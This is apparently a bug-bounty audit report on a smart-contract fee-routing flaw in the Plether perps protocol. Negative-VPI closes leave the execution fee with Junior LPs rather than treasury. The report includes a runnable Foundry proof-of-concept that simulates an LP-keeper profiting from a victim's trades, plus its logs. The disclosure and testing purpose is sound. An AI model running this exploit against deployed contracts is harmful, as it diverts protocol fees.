# \#99372 [SC-Medium] Negative-VPI closes route charged execution fees to Junior LPs instead of treasury

**Submitted on Nov 13th 2026 at 12:02:04 UTC by @Jornason for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99372
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

At commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, a close whose negative VPI exceeds its other action charges reduces the trader's rebate by the nominal execution fee, but then truncates the fee amount used for treasury funding to zero. The fee-sized value consequently remains in HousePool and becomes redeemable Junior LP value rather than treasury margin, even when the same cash-priority rules can fund it. In a local release-parameter PoC using only public V3 orders, an unrelated trader opens and closes while a pre-existing Junior LP acts as a permissionless keeper and later exits normally. That LP and its keeper account finish 40.162536 USDG above an otherwise identical idle branch; 0.2 USDG is ordinary keeper compensation. A one-line research control using the nominal fee as the top-up basis reduces this differential to 0.202496 USDG, increases actual treasury withdrawal from 40 to 80 USDG, and leaves the victim's withdrawal unchanged. The fee-attributable realized LP differential is therefore 39.960040 USDG. Two third-party round trips omit 80 USDG of close-fee credit. This is a Medium Griefing candidate based on a protocol-fee recipient mismatch, not a claim of existing-principal theft, unclaimed-yield theft, insolvency, or a fund freeze.

## Vulnerability Details

### Affected code and intended recipient boundary

The affected implementation is in `packages/perps/src`, principally `libraries/CfdEnginePlanLib.sol` and the close settlement path in `CfdEngineSettlementSidecar.sol`. `CloseAccountingLib` calculates the nominal execution fee from the actual closed notional. The close planner first includes that fee in the signed action amount, then replaces `delta.executionFeeAssets` with only the portion backed by positive withheld or collected action cash. The later pool-funded top-up uses the truncated field rather than the nominal fee.

The intended economic separation is explicit in the public fee guide: a cash-credited protocol execution fee belongs to protocol treasury, while an uncredited amount is neither a treasury receivable nor LP revenue. The guide also says that full closes are charged execution fees and that available pool cash can fund those credits after trader-payout and claim priority. `WHITEPAPER.md` similarly separates protocol execution fees from LP assets. The defect is therefore not merely that an optional fee is waived; a fee already netted into the trader's settlement is silently left as LP-owned value instead of reaching its designated recipient or being explicitly waived back to the trader.

### Root cause

The planner computes the signed action amount as follows:

```solidity
int256 actionNetAssets = cs.vpiDeltaAssets
    + int256(
        cs.executionFeeAssets + cs.frozenSpreadAssets + delta.pendingCarryAssets - delta.realizedCarryAssets
    );
```

When negative VPI dominates, the trader receives only the net rebate:

```solidity
} else if (actionNetAssets < 0) {
    delta.actionRebateAssets = uint256(-actionNetAssets);
}
```

The nominal fee has already reduced that rebate. The planner then computes eligibility only from positive cash sources and overwrites the fee field:

```solidity
uint256 executionFeeEligibleAssets = nonClawbackWithheldAssets + nonVpiReserveCollectedAssets;
delta.executionFeeAssets =
    cs.executionFeeAssets < executionFeeEligibleAssets ? cs.executionFeeAssets : executionFeeEligibleAssets;
```

For the demonstrated negative-net close, both eligibility components are zero. The subsequent top-up therefore requests zero even though its free-cash check is not the limiting factor:

```solidity
uint256 feeTopUpAssets = delta.executionFeeAssets - delta.actionProtocolFeeCreditedAssets;
freePoolCashAssets =
    _freePoolCashForProtocolFee(snap, delta, poolCashAfterCollectionsAssets, claimsAfterPriceNettingAssets);
delta.protocolFeeTopUpAssets = feeTopUpAssets < freePoolCashAssets ? feeTopUpAssets : freePoolCashAssets;
```

The authenticated receipt's `executionFeeAssets` is instead populated from `delta.closeState.executionFeeAssets` in `CfdOrderPolicyEvaluatorBase.sol`, so it retains the nominal fee. It must not be confused with the planner's eligible fee or with the actual treasury credit. In the PoC, the close receipt fee is 40.000000 USDG, the planner eligible fee is zero, and the actual close treasury credit is zero.

The measured close has gross VPI of -49.897714 USDG and a 40.000000 USDG nominal execution fee. The fee reduces the trader's VPI rebate to approximately 9.897714 USDG before the separately logged 14 atoms of carry. The defect is that the corresponding 40 USDG does not reach treasury and instead remains in Pool/Junior value.

### Threat model and public attack path

The attacker needs ordinary Junior LP capital before an unrelated trader's order flow. It does not need a privileged role, victim cooperation, a malicious keeper, oracle manipulation, direct Engine calls, storage mutation, or an administrator action. Any caller may execute public orders under the competition's explicit keeper model; the attacker cannot force the victim to trade.

The demonstrated path is:

1. The attacker already holds non-seed Junior shares through the normal LP flow.
2. An unrelated victim funds its own account and submits a 100,000-unit LONG open with 4,000 USDG margin at a valid 1.00 mark. The attacker executes it as a public keeper. The opening execution fee is credited normally.
3. At the same price, the victim submits a full close. Its negative VPI exceeds the 40 USDG close fee. The attacker executes that public close as keeper. The victim receives the post-fee rebate, but treasury receives no close fee.
4. The victim withdraws 9,919.797501 USDG through the ordinary Clearinghouse path. The attacker withdraws its ordinary 0.2 USDG keeper credit.
5. With no position left open, the attacker follows the ordinary LP request, epoch settlement and claim path for the same non-seed shares. A restored-snapshot idle branch performs no trade and exits identical shares at the same epoch.
6. Treasury withdraws its actual margin. In the fixed-source branch it receives only the 40 USDG opening fee, rather than the 80 USDG represented by the two nominal execution fees.

This path does not depend on redeeming between the open and close, buying LP shares after the close, or transferring a later rebate to another LP cohort. The LP exists before the open and exits only after the position is flat. That distinguishes the fee-top-up root cause from an LP-cohort VPI timing issue.

### Same-path economic control

The research-only control changes only the top-up basis from the already-truncated `delta.executionFeeAssets` to nominal `cs.executionFeeAssets`, retaining the existing free-cash cap and payout order. It is causal evidence, not a fully audited production patch. The fixed-source PoC is always run before this control, and the source is restored and checked afterward.

| Measurement (USDG) | Fixed source | Nominal-fee control |
| --- | ---: | ---: |
| Close receipt nominal fee | 40.000000 | 40.000000 |
| Planner eligible fee | 0.000000 | 0.000000 |
| Actual close treasury credit | 0.000000 | 40.000000 |
| Pool round-trip delta | 40.002499 | 0.002499 |
| Victim actual withdrawal | 9,919.797501 | 9,919.797501 |
| Treasury actual withdrawal | 40.000000 | 80.000000 |
| LP redemption increment over idle | 39.962536 | 0.002496 |
| Ordinary keeper credit | 0.200000 | 0.200000 |
| Attacker total increment over idle | 40.162536 | 0.202496 |

The Pool delta differs by exactly 40 USDG, treasury gains exactly 40 USDG, and the victim's realized withdrawal is unchanged. The attacker's realized result decreases by `40.162536 - 0.202496 = 39.960040 USDG`. This isolates the fee-recipient effect instead of treating every Pool increase, VPI movement, carry atom, or keeper payment as exploit profit.

### Bounded repetition

A second test executes two complete third-party round trips with the same public calls and final withdrawals. The four nominal open/close fees total 160 USDG, but treasury can withdraw only 80 USDG, so two close fees totaling 80 USDG are uncredited. The LP's ordinary redemption gains 79.925073 USDG relative to idle, while ordinary keeper credit totals 0.4 USDG. The combined attacker increment is 80.325073 USDG. This demonstrates repeatability twice; it is not an assertion of unlimited production order flow or loss.

### Why this is not the nearby known behavior

- Cecuro MED-6 concerns fee top-ups spending protected LP/trader reserves. This candidate instead requests zero top-up because the nominal fee basis was overwritten, even though the same guarded cash can fund it. Fixing reserve caps alone does not restore that fee.
- LOW-26 concerns an open admission failure when an unaffordable top-up is assumed. This candidate is a successful close with a missing recipient credit under adequate cash, not an open solvency rejection.
- LP-cohort VPI timing findings concern positive opening VPI becoming redeemable before a later pool-funded rebate. Here the attacker predates the open and exits after the close; the control changes only fee attribution and leaves the VPI/cohort sequence intact.
- An uncredited amount is not automatically a vulnerability. Cash-shortage and trader-priority waivers are documented. This report relies on the fee reducing the trader's rebate, the available same-priority funding demonstrated by the control, and the residual becoming actual LP proceeds despite the public statement that an uncredited amount is not LP revenue.

### Recommended remediation

Keep the nominal execution fee separate from the portion directly credited out of eligible action cash. Calculate any pool-funded shortfall from the nominal fee and the actual direct credit, while retaining trader-payout priority, protected-reserve rules, and the free-cash cap. Do not simply remove the cap or create a treasury receivable.

Regression tests should cover negative and positive VPI, full and partial closes, carry, frozen spread, direct-cash and reserve-funded charges, low cash, trader claims, and full/treasury/LP withdrawals. They should assert exact recipient attribution, unchanged trader entitlement where intended, no double credit, and no consumption of protected LP reserves. The supplied one-line control demonstrates the relevant causal boundary but is not represented as a complete production remediation.

## Impact Details

The selected impact is **Medium — Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)**.

An ordinary LP can realize value from a protocol-designated execution fee that never reaches treasury. The effect is a persistent recipient mismatch, not a display discrepancy: treasury's actual withdrawal is lower, Pool value differs by exactly the nominal close fee, and the LP can exit through normal claims. Two repetitions measurably omit 80 USDG of close-fee credit.

The report selects Griefing rather than claiming a higher theft impact because the program's accounting specification says uncredited fee amounts are not withdrawable protocol inventory. The measured path does not reduce existing treasury principal, and the victim's withdrawal is identical under the fixed source and nominal-fee control. Profitability of the LP variant alone does not prove direct theft of existing user funds or theft of unclaimed yield. The claimed damage is the misrouted conditional protocol service fee and the violation of the documented treasury/LP recipient boundary.

No protocol insolvency, permanent or timed fund freeze, block stuffing, gas theft, or smart-contract token shortage is claimed. The trader, treasury, keeper, and LP all complete their applicable withdrawals in the PoC. No post-close LP entry or retrospective capture is claimed.

The PoC deploys the fixed scoped source locally with release parameters: VPI 1%, maintenance margin 10 bps, initial margin 20 bps, FAD margin 300 bps, carry 500 bps, execution fee 4 bps, and the documented 40 million USDG / 80% Senior cap. Only out-of-scope Pyth and USDG dependencies are mocked. The fixture's LP capital, test-token minting, local oracle data, and capacity setup are deployment preparation, not attacker privileges. Production LP ownership, unrelated order flow, liquidity, gas, USDG market value, public-network profitability, and deployed bytecode are not independently established. Two round trips are shown, not unlimited capacity. Platform acceptance and private duplicate submissions remain unknown.

## References

- Competition Scope: https://immunefi.com/audit-competition/plether/scope/#top
- Fixed close planner: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L984-L987
- Close fee eligibility truncation: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1041-L1073
- Accounting specification: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L1109-L1121
- Public fee guide: https://docs.plether.com/how-plether-works/trading-costs-fees-carry-and-vpi
- Runnable PoC and verification artifacts: https://gist.github.com/Jornason/0c9ce01b402eab04c4ca1f224613e85e



## Link to Proof of Concept

https://gist.github.com/Jornason/0c9ce01b402eab04c4ca1f224613e85e

## Proof of Concept

## Proof of Concept

### Overview

This PoC deploys the fixed scoped source locally with release parameters and executes two fixed-source tests plus one research-only control. It uses public V3 `commitOrder` and `executeOrder`, authenticated receipts, actual Clearinghouse withdrawals, and ordinary LP epoch redemption. Only out-of-scope Pyth and USDG dependencies are mocked. It requires no RPC, private key, public-chain transaction, online Hermes request, or live Pyth call.

The complete test source is included below and is also supplied as `NegativeVpiFeeRecipient.t.sol`. Its SHA-256 is `6f41abdbc2cd64eda4eb1b0cc06b6f0a665263f2ec10db7f46279c48f920af08`.

The complete PoC environment is available in this verified secret Gist: https://gist.github.com/Jornason/0c9ce01b402eab04c4ca1f224613e85e

### Step-by-step explanation

1. Prepare the official repository at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` with its pinned submodules. Save the complete source below as `packages/perps/test/perps/differential/NegativeVpiFeeRecipient.t.sol`.
2. The fixture deploys the scoped contracts with VPI 1%, maintenance margin 10 bps, initial margin 20 bps, FAD margin 300 bps, carry 500 bps, execution fee 4 bps, a 60-second order window, and the documented 40 million USDG / 80% Senior cap. The cap is applied through the documented configuration path before trading. Only local mock USDG and Pyth data replace out-of-scope dependencies.
3. The attacker is the test's ordinary pre-existing Junior LP holder, not the protocol treasury or the victim. Its non-seed shares and starting Clearinghouse balance are measured before any victim order. It does not acquire LP shares after the close.
4. An unrelated victim funds its own account with 10,000 USDG. The victim publicly commits a 100,000-unit LONG open with 4,000 USDG margin at a valid 1.00 mark. The attacker calls the permissionless `executeOrder` as keeper, and the test authenticates the resulting receipt and executor. The opening fee is 40 USDG.
5. Before the close, the test confirms a valid preview with negative VPI greater than the nominal 40 USDG close fee and Pool free assets greater than that fee. This establishes the negative-net condition without writing position or Pool storage.
6. The victim publicly commits a full close and the attacker executes it through the same public path. The close VPI is -49.897714 USDG. The authenticated receipt preserves the nominal 40 USDG fee, the planner's eligible fee is zero, and the independently measured close treasury credit is zero.
7. The victim withdraws 9,919.797501 USDG. The attacker withdraws 0.2 USDG of ordinary keeper credit. The victim's result is measured independently and is not relabeled as exploit profit or loss caused by the fee mismatch.
8. The attacker requests redemption of all its non-seed Junior shares, advances through the ordinary LP cooldown and epoch, settles through the public Router, and claims the proceeds. A restored-snapshot idle branch exits identical shares at the same epoch without trading. The active-minus-idle LP redemption difference is 39.962536 USDG; total attacker value including ordinary keeper credit increases by 40.162536 USDG.
9. Treasury performs a real withdrawal and receives 40 USDG, only the opening fee, although the two nominal execution fees total 80 USDG. This demonstrates the recipient mismatch in realized balances rather than only a NAV quote.
10. A second fixed-source test performs two full third-party round trips. The four nominal fees total 160 USDG, treasury withdraws 80 USDG, LP redemption exceeds idle by 79.925073 USDG, and ordinary keeper credit totals 0.4 USDG. Total attacker increment is 80.325073 USDG. This is bounded twice-repeated evidence, not an assertion of unlimited capacity.
11. A research-only control changes the top-up basis from truncated `delta.executionFeeAssets` to nominal `cs.executionFeeAssets` in `CfdEnginePlanLib.sol:984`. The same public calls and withdrawals then produce 40 USDG of close treasury credit and 80 USDG of total treasury withdrawal. The victim still withdraws exactly 9,919.797501 USDG, and ordinary keeper credit remains 0.2 USDG. LP redemption increment falls to 0.002496 USDG and total attacker increment to 0.202496 USDG. Therefore the fee-attributable attacker difference is `40.162536 - 0.202496 = 39.960040 USDG`.
12. The supplied runner always runs the original fixed-source tests first, applies the one-line patch only for the research control, reverses it afterward, and verifies `git diff --exit-code -- packages/perps/src`. The patch is not represented as the vulnerable-state execution or as a complete production remediation.

### Reproduction

From a clean official checkout:

```bash
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
```

Use the supplied runner from the directory containing the PoC files:

```bash
PLETHER_REPO_ROOT=/path/to/audit-comp-plether ./run-poc.sh
```

The runner checks the fixed commit, scoped tree, source cleanliness, test SHA-256 and patch SHA-256. It copies only the neutral test when needed, runs both suites, restores the research patch, and verifies scoped-source cleanliness. It never overwrites an existing different test.

For the fixed-source tests alone, copy `NegativeVpiFeeRecipient.t.sol` to `packages/perps/test/perps/differential/NegativeVpiFeeRecipient.t.sol` and run from `packages/perps`:

```bash
forge test --offline --threads 1 \
  --match-path test/perps/differential/NegativeVpiFeeRecipient.t.sol \
  --match-contract NegativeVpiFeeRecipientTest -vv
```

The control contract in the same file is named `NominalFeeRecipientControlTest`. Use the supplied runner for that suite so the patch application and restoration are preserved.

### Expected results

The completed runner produced the following test-result and application-log sections. Compiler warnings are omitted; no test result or application log line is omitted.

```text
Ran 2 tests for test/perps/differential/NegativeVpiFeeRecipient.t.sol:NegativeVpiFeeRecipientTest
[PASS] test_ThirdPartyFlowPaysExistingLpAndKeeper() (gas: 8340621)
Logs:
  victim withdrawal 9919797501
  close receipt fee 40000000
  close planner fee 0
  close treasury credit 0
  treasury actually withdrawn 40000000
  pool delta over victim round trip 40002499
  LP redemption with victim flow 1000039287404
  LP redemption with idle flow 999999324868
  attacker keeper settlement credit 200000
  LP redemption delta 39962536
  attacker total delta versus idle 40162536

[PASS] test_TwoThirdPartyRoundTripsAccumulateFeeRecipientExtraction() (gas: 13619156)
Logs:
  completed third-party round trips 2
  pool delta after two round trips 80004998
  treasury actually withdrawn 80000000
  nominal open and close fees 160000000
  victim withdrawal after two round trips 9839595002
  attacker keeper settlement credit 400000
  LP gain after two victim round trips 79925073
  attacker total gain after two victim round trips 80325073

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 33.01ms (23.80ms CPU time)

Ran 1 test suite in 34.77ms (33.01ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

The research control produced:

```text
Ran 1 test for test/perps/differential/NegativeVpiFeeRecipient.t.sol:NominalFeeRecipientControlTest
[PASS] test_NominalFeeTopUpRestoresTreasuryRecipient() (gas: 8362583)
Logs:
  victim withdrawal 9919797501
  close receipt fee 40000000
  close planner fee 0
  close treasury credit 40000000
  treasury actually withdrawn 80000000
  pool delta over victim round trip 2499
  LP redemption with victim flow 999999327364
  LP redemption with idle flow 999999324868
  attacker keeper settlement credit 200000
  LP redemption delta 2496
  attacker total delta versus idle 202496

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.61ms (9.69ms CPU time)

Ran 1 test suite in 19.58ms (18.61ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Complete Solidity source

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {console2} from "forge-std/console2.sol";

abstract contract NegativeVpiFeeRecipientHarness is BasePerpTest {

    address internal constant VICTIM = address(0xB0B);
    uint256 internal constant SIZE = 100_000e18;
    uint256 internal constant MARGIN = 4000e6;
    uint256 internal constant PRICE = 1e8;
    uint256 internal constant FUNDING = 10_000e6;

    struct Observation {
        uint256 attackerFundsAfter;
        uint256 juniorProceeds;
        uint256 keeperCredit;
        uint256 victimWithdrawal;
        uint256 treasuryRealized;
        uint256 closeTreasuryCredit;
        uint256 closeReceiptFee;
        uint256 closePreviewFee;
        int256 closeVpi;
        uint256 poolDelta;
        uint256 totalNominalFees;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _verifyThirdPartyFlow(
        uint256 expectedCloseCredit,
        uint256 expectedTreasury,
        uint256 expectedPoolDelta,
        uint256 expectedJuniorDelta,
        uint256 expectedAttackerDelta
    ) internal {
        _setSeniorCapacity(40_000_000e6, 8000);
        address attacker = address(this);
        address treasury = engine.protocolTreasury();
        assertNotEq(attacker, VICTIM);
        assertNotEq(attacker, treasury);
        assertEq(clearinghouse.balanceAssets(attacker), 0);
        uint256 shares = juniorVault.balanceOf(attacker) - juniorVault.seedShareFloor();
        uint256 branchPoint = vm.snapshotState();

        Observation memory active = _thirdPartyBranch(attacker, treasury, shares, true);
        assertEq(active.closePreviewFee, 0);
        assertEq(active.closeReceiptFee, 40_000_000);
        assertEq(active.closeTreasuryCredit, expectedCloseCredit);
        assertLt(active.closeVpi, -int256(active.closeReceiptFee));
        assertEq(active.totalNominalFees, 80_000_000);
        assertEq(active.treasuryRealized, expectedTreasury);
        assertEq(active.totalNominalFees - active.treasuryRealized, 40_000_000 - expectedCloseCredit);
        assertEq(active.victimWithdrawal, 9_919_797_501);
        assertEq(active.keeperCredit, 200_000);
        assertEq(active.poolDelta, expectedPoolDelta);
        assertGt(active.juniorProceeds, 0);

        assertTrue(vm.revertToState(branchPoint));
        Observation memory idle = _thirdPartyBranch(attacker, treasury, shares, false);
        assertEq(idle.treasuryRealized, 0);
        assertEq(idle.keeperCredit, 0);
        assertEq(idle.victimWithdrawal, FUNDING);
        assertEq(active.juniorProceeds - idle.juniorProceeds, expectedJuniorDelta);
        assertEq(active.attackerFundsAfter - idle.attackerFundsAfter, expectedAttackerDelta);
        console2.log("victim withdrawal", active.victimWithdrawal);
        console2.log("close receipt fee", active.closeReceiptFee);
        console2.log("close planner fee", active.closePreviewFee);
        console2.log("close treasury credit", active.closeTreasuryCredit);
        console2.log("treasury actually withdrawn", active.treasuryRealized);
        console2.log("pool delta over victim round trip", active.poolDelta);
        console2.log("LP redemption with victim flow", active.juniorProceeds);
        console2.log("LP redemption with idle flow", idle.juniorProceeds);
        console2.log("attacker keeper settlement credit", active.keeperCredit);
        console2.log("LP redemption delta", active.juniorProceeds - idle.juniorProceeds);
        console2.log("attacker total delta versus idle", active.attackerFundsAfter - idle.attackerFundsAfter);
    }

    function _verifyTwoThirdPartyRoundTrips() internal {
        _setSeniorCapacity(40_000_000e6, 8000);
        address attacker = address(this);
        address treasury = engine.protocolTreasury();
        uint256 shares = juniorVault.balanceOf(attacker) - juniorVault.seedShareFloor();
        uint256 branchPoint = vm.snapshotState();
        Observation memory active;
        uint256 poolBefore = pool.totalAssets();
        _fundTrader(VICTIM, FUNDING);

        for (uint256 i; i < 2; ++i) {
            OrderV3Types.OrderReceipt memory openReceipt = _executeFor(
                VICTIM,
                attacker,
                CfdTypes.Side.LONG,
                SIZE,
                MARGIN,
                false,
                i == 0 ? bytes32("submission-open-0") : bytes32("submission-open-1")
            );
            active.totalNominalFees += openReceipt.economics.executionFeeAssets;
            ICfdEngineTypes.ClosePreview memory preview = engineLens.previewClose(VICTIM, SIZE, PRICE);
            assertTrue(preview.valid);
            assertEq(preview.executionFeeAssets, 0);
            assertLt(preview.vpiDeltaAssets, -40_000_000);
            assertGt(pool.getFreeAssets(), 40_000_000);
            uint256 treasuryBeforeClose = clearinghouse.balanceAssets(treasury);
            OrderV3Types.OrderReceipt memory closeReceipt = _executeFor(
                VICTIM,
                attacker,
                CfdTypes.Side.LONG,
                SIZE,
                0,
                true,
                i == 0 ? bytes32("submission-close-0") : bytes32("submission-close-1")
            );
            assertEq(closeReceipt.economics.executionFeeAssets, 40_000_000);
            assertEq(clearinghouse.balanceAssets(treasury) - treasuryBeforeClose, 0);
            active.totalNominalFees += closeReceipt.economics.executionFeeAssets;
            active.closeReceiptFee = closeReceipt.economics.executionFeeAssets;
            active.closeVpi = preview.vpiDeltaAssets;
        }
        active.poolDelta = pool.totalAssets() - poolBefore;
        active.keeperCredit = clearinghouse.balanceAssets(attacker);
        vm.prank(attacker);
        clearinghouse.withdraw(attacker, active.keeperCredit);
        active.victimWithdrawal = clearinghouse.balanceAssets(VICTIM);
        vm.prank(VICTIM);
        clearinghouse.withdraw(VICTIM, active.victimWithdrawal);
        active.juniorProceeds = _redeemAllAvailableJunior(attacker, shares);
        uint256 treasuryWalletBefore = settlementToken.balanceOf(treasury);
        uint256 treasuryBalance = clearinghouse.balanceAssets(treasury);
        vm.prank(treasury);
        clearinghouse.withdraw(treasury, treasuryBalance);
        active.treasuryRealized = settlementToken.balanceOf(treasury) - treasuryWalletBefore;
        active.attackerFundsAfter = settlementToken.balanceOf(attacker) + clearinghouse.balanceAssets(attacker);

        assertEq(active.totalNominalFees, 160_000_000);
        assertEq(active.treasuryRealized, 80_000_000);
        assertEq(active.poolDelta, 80_004_998);
        assertEq(active.victimWithdrawal, 9_839_595_002);
        assertEq(active.keeperCredit, 400_000);

        assertTrue(vm.revertToState(branchPoint));
        Observation memory idle = _thirdPartyBranch(attacker, treasury, shares, false);
        assertEq(active.juniorProceeds - idle.juniorProceeds, 79_925_073);
        assertEq(active.attackerFundsAfter - idle.attackerFundsAfter, 80_325_073);
        console2.log("completed third-party round trips", uint256(2));
        console2.log("pool delta after two round trips", active.poolDelta);
        console2.log("treasury actually withdrawn", active.treasuryRealized);
        console2.log("nominal open and close fees", active.totalNominalFees);
        console2.log("victim withdrawal after two round trips", active.victimWithdrawal);
        console2.log("attacker keeper settlement credit", active.keeperCredit);
        console2.log("LP gain after two victim round trips", active.juniorProceeds - idle.juniorProceeds);
        console2.log("attacker total gain after two victim round trips", active.attackerFundsAfter - idle.attackerFundsAfter);
    }

    function _thirdPartyBranch(
        address attacker,
        address treasury,
        uint256 shares,
        bool trade
    ) internal returns (Observation memory observation) {
        uint256 poolBefore = pool.totalAssets();
        _fundTrader(VICTIM, FUNDING);
        if (trade) {
            OrderV3Types.OrderReceipt memory openReceipt = _executeFor(
                VICTIM, attacker, CfdTypes.Side.LONG, SIZE, MARGIN, false, bytes32("submission-victim-open")
            );
            observation.totalNominalFees += openReceipt.economics.executionFeeAssets;
            ICfdEngineTypes.ClosePreview memory preview = engineLens.previewClose(VICTIM, SIZE, PRICE);
            assertTrue(preview.valid);
            observation.closePreviewFee = preview.executionFeeAssets;
            observation.closeVpi = preview.vpiDeltaAssets;
            assertGt(pool.getFreeAssets(), openReceipt.economics.executionFeeAssets);
            uint256 treasuryBeforeClose = clearinghouse.balanceAssets(treasury);
            OrderV3Types.OrderReceipt memory closeReceipt = _executeFor(
                VICTIM, attacker, CfdTypes.Side.LONG, SIZE, 0, true, bytes32("submission-victim-close")
            );
            observation.totalNominalFees += closeReceipt.economics.executionFeeAssets;
            observation.closeReceiptFee = closeReceipt.economics.executionFeeAssets;
            observation.closeTreasuryCredit = clearinghouse.balanceAssets(treasury) - treasuryBeforeClose;
            observation.poolDelta = pool.totalAssets() - poolBefore;
        }

        observation.keeperCredit = clearinghouse.balanceAssets(attacker);
        if (observation.keeperCredit > 0) {
            vm.prank(attacker);
            clearinghouse.withdraw(attacker, observation.keeperCredit);
        }
        uint256 victimBalance = clearinghouse.balanceAssets(VICTIM);
        if (victimBalance > 0) {
            vm.prank(VICTIM);
            clearinghouse.withdraw(VICTIM, victimBalance);
            observation.victimWithdrawal = victimBalance;
        }
        observation.juniorProceeds = _redeemAllAvailableJunior(attacker, shares);
        uint256 treasuryBalance = clearinghouse.balanceAssets(treasury);
        uint256 treasuryWalletBefore = settlementToken.balanceOf(treasury);
        if (treasuryBalance > 0) {
            vm.prank(treasury);
            clearinghouse.withdraw(treasury, treasuryBalance);
        }
        observation.treasuryRealized = settlementToken.balanceOf(treasury) - treasuryWalletBefore;
        observation.attackerFundsAfter = settlementToken.balanceOf(attacker) + clearinghouse.balanceAssets(attacker);
    }

    function _executeFor(
        address trader,
        address executor,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        bytes32 clientOrderId
    ) internal returns (OrderV3Types.OrderReceipt memory receipt) {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = clientOrderId;
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
        assertEq(router.maxExecutionWindowSeconds(), 60);
        _startRecordingLogs();
        vm.prank(trader);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory updateData = _mockPythUpdateData(PRICE);
        vm.prank(executor);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, updateData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        receipt = _verifiedReceipt(router.lifecycleBook(), orderId);
        assertEq(uint8(receipt.reason), uint8(OrderV3Types.TerminalReason.Executed));
        assertEq(receipt.executor, executor);
    }

    function _redeemAllAvailableJunior(address lp, uint256 expectedShares) internal returns (uint256 paid) {
        vm.warp((block.timestamp / pool.LP_EPOCH_DURATION() + 1) * pool.LP_EPOCH_DURATION());
        uint256 shares = juniorVault.maxRequestRedeem(lp);
        assertEq(shares, expectedShares, "both branches must have identical redeemable shares");
        uint256 requestId = juniorVault.requestRedeem(shares, lp, lp);
        vm.warp(pool.lpEpochStart(requestId));
        router.settleLpEpoch(_mockPythUpdateData(PRICE));
        assertEq(juniorVault.claimableRedeemRequest(requestId, lp), shares);
        uint256 before = settlementToken.balanceOf(lp);
        juniorVault.claimRedeem(requestId, shares, lp, lp);
        paid = settlementToken.balanceOf(lp) - before;
        assertGt(paid, 0);
    }

}

contract NegativeVpiFeeRecipientTest is NegativeVpiFeeRecipientHarness {
    function test_ThirdPartyFlowPaysExistingLpAndKeeper() public {
        _verifyThirdPartyFlow(0, 40_000_000, 40_002_499, 39_962_536, 40_162_536);
    }

    function test_TwoThirdPartyRoundTripsAccumulateFeeRecipientExtraction() public {
        _verifyTwoThirdPartyRoundTrips();
    }
}

contract NominalFeeRecipientControlTest is NegativeVpiFeeRecipientHarness {
    function test_NominalFeeTopUpRestoresTreasuryRecipient() public {
        _verifyThirdPartyFlow(40_000_000, 80_000_000, 2_499, 2_496, 202_496);
    }
}
```
